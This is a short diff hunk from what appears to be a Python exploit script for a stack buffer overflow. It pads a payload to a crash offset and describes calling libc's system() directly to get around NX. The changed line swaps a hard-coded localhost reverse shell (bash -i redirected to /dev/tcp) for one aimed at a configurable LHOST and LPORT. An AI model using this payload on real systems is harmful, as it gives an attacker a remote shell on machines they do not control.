@@ -29,7 +29,7 @@ if PATTERN_ONLY:
     PAYLOAD = PATTERN
 else:
     # Store payload on stack. it can't be directly executed though due to NX
-    PAYLOAD = "bash -i >& /dev/tcp/127.0.0.1/8889 0>&1\x00"
+    PAYLOAD = "bash -i >& /dev/tcp/{}/{} 0>&1\x00".format(LHOST, LPORT)
     # First A to fix alignment because rdi points to rsp+1
     PAYLOAD = "A" + PAYLOAD + "A" * (OFFSET - len(PAYLOAD) - 1)
     # Directly call libc's system()
